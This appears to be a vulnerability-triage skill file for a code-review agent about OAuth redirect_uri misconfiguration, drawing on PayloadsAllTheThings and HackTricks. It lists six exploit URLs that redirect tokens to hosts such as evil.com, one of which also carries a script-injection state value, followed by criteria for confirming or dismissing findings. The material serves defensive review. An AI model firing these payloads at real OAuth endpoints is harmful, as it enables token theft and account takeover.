# OAuth Misconfiguration — @grantghost skill
> cats: (advisory — no static taint rule yet) · severity: high
> sources: PayloadsAllTheThings, HackTricks

## What it is
Redirect to a controlled domain to get the access token

## Exploit payloads (from PayloadsAllTheThings)
- `https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful`
- `https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com`
- `https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToA`
- `https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattack`
- `https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com`
- `https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth%20Misconfiguration
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=OAuth%20Misconfiguration
- HackTricks Cloud: https://cloud.hacktricks.wiki/

## HackTricks pages (1)

- [OAuth to Account Takeover](https://hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover)

## References
- HackTricks: https://hacktricks.wiki/en/
- HackTricks repo: https://github.com/HackTricks-wiki/hacktricks
